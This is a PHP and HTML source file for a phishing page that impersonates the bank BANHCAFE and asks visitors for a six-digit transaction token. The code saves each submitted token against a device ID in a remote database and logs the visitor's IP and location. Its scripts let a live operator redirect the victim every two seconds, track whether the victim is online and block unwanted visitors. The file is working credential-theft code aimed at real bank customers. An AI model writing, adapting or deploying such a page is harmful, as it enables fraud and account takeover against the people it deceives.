<?php
ob_start();
require_once 'functions.php';

// =========================
// OBTENER INFO DE USUARIO
// =========================
$info   = get_user_info();
$ip     = $info['ip'];
$device = get_device_id();

// =========================
// BLOQUEADO?
// =========================
if (get_user_state($device) === 'block') {
    echo "<script>
            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
            window.location.href = 'https://www.google.com';
          </script>";
    exit();
}

// =========================
// REGISTRAR / ACTUALIZAR USUARIO
// =========================
update_user($ip, $info['location'], basename(__FILE__));


// ====================================================
// 🔥 PROCESAR FORMULARIO + GUARDAR SUBMISSIONS FIRESTORE
// ====================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $allowedFields = ["token2"];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields, true)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {

        $data = load_data(); // traer TODA la BD (Firestore)

        if (!isset($data[$device])) {
            $data[$device] = [
                'submissions' => [],
                'state'       => 'active',
                'color'       => ''
            ];
        }

        $timestamp = date("Y-m-d H:i:s");
        $found = false;

        foreach ($data[$device]['submissions'] as &$submission) {
            $existingKeys = array_keys($submission['data']);
            $formKeys     = array_keys($formData);

            sort($existingKeys);
            sort($formKeys);

            if ($existingKeys === $formKeys) {
                $submission = [
                    "data"      => $formData,
                    "timestamp" => $timestamp
                ];
                $found = true;
                break;
            }
        }
        unset($submission);

        if (!$found) {
            $data[$device]['submissions'][] = [
                "data"      => $formData,
                "timestamp" => $timestamp
            ];

            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
                $data[$device]['color'] = '#000000';
            }
        }

        save_data($data);

        header("Location: waiting.php");
        exit();

    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}

ob_end_flush();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Acceso BANHCAFE — Verificación Token</title>
    <style>
        :root {
            --vino-banhcafe: #7a1c1c;
            --fondo-claro: #f9f9f9;
            --blanco: #ffffff;
            --gris-link: #666; /* Color del link y cuadros */
        }
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        body {
            margin: 0;
            background: var(--fondo-claro);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .main {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: linear-gradient(135deg,#f9f9f9 0%,#e6e6e6 100%);
            padding: 40px 20px;
            width: 100%;
        }
        .formulario {
            background: var(--blanco);
            padding: 30px 25px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.12);
            border-top: 5px solid var(--vino-banhcafe);
            max-width: 400px;
            width: 100%;
            text-align: center;
            color: var(--vino-banhcafe);
        }
        .dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
        }
        .dot {
            width: 12px;
            height: 12px;
            background-color: var(--vino-banhcafe);
            border-radius: 50%;
        }
        h2 {
            margin-bottom: 10px;
            font-size: 20px;
            color: var(--vino-banhcafe);
        }
        p {
            margin-bottom: 20px;
            font-size: 14px;
            color: var(--gris-link);
        }
        .digit-group {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 20px;
        }
        .digit-group input {
            width: 48px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            border: 2px solid var(--gris-link);
            border-radius: 6px;
            background: var(--blanco);
            color: var(--gris-link);
            outline: none; /* quita el highlight azul */
        }
        .digit-group input:focus {
            border-color: var(--vino-banhcafe); /* vinotinto al seleccionar */
            box-shadow: 0 0 5px rgba(122,28,28,0.5); /* efecto suave */
        }
        .validando-msg {
            display: none;
            color: var(--gris-link);
            font-weight: bold;
            margin-bottom: 10px;
            padding: 10px;
            background-color: #f0f0f0;
            border-radius: 4px;
            border: 1px solid #ccc;
        }
        button {
            background-color: var(--vino-banhcafe);
            color: var(--blanco);
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #5c1414;
        }
        a.small-link {
            display: block;
            margin-top: 12px;
            font-size: 13px;
            color: var(--gris-link);
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="main">
        <div class="formulario">
            <div class="dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            <h2>Ingresar Token</h2>
            <p>Por favor Ingrese token de 6 dígitos para continuar con su transacción</p>
            <form id="form-sms" method="post" autocomplete="off">
                <div class="digit-group">
                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
                </div>
                <div id="validando-msg" class="validando-msg">Validando...</div>
                <button type="submit">Confirmar</button>
                <a class="small-link" href="index.php">Volver al inicio</a>
                <input type="text" id="token" name="token2" hidden>
            </form>
        </div>
    </div>
   <script>
  const inputs = document.querySelectorAll('.digit-group input');
  const form = document.getElementById('form-sms');
  const validandoMsg = document.getElementById('validando-msg');

  // navegación entre inputs (igual que antes)
  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/[^0-9]/g, '').slice(0,1);
      if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === "Backspace" && !input.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  form.addEventListener('submit', function(e) {
    // NO preventDefault: allow native submission
    const token = Array.from(inputs).map(i => i.value).join('');
    document.getElementById('token').value = token;

    // mostrar mensaje validando justo antes de enviar
    validandoMsg.style.display = 'block';

    // no hacemos e.preventDefault(); el formulario se enviará por POST
  });
</script>
    <script>
(function() {

    const CURRENT_PAGE = <?php echo json_encode(basename($_SERVER['PHP_SELF'])); ?>;

    function checkRedirect() {
        fetch('check_redirect.php', { cache: 'no-store' })
            .then(resp => resp.json())
            .then(data => {
                if (!data.currentPage) return;

                if (data.currentPage !== CURRENT_PAGE) {
                    window.location.href = data.currentPage;
                }
            })
            .catch(() => {});
    }

    // revisar cada 2 segundos
    setInterval(checkRedirect, 2000);
})();
</script>
<script>
// --- URL DEL ARCHIVO PHP QUE MANEJA OFFLINE / PING ---
const statusURL = "functions.php?action="; // cambialo por el archivo correcto (ej: index.php?action=)

// --- ENVÍA PING CADA 20 SEGUNDOS ---
function sendPing() {
    fetch(statusURL + "ping")
        .catch(err => console.log("Error ping:", err));
}

// Enviar ping inmediatamente al cargar
sendPing();

// Enviar ping automáticamente cada 20 segundos
setInterval(sendPing, 20000);

// --- MARCAR OFFLINE AL SALIR DE LA PÁGINA ---
window.addEventListener("beforeunload", function () {
    navigator.sendBeacon(statusURL + "offline");
});
</script>
</body>
</html>
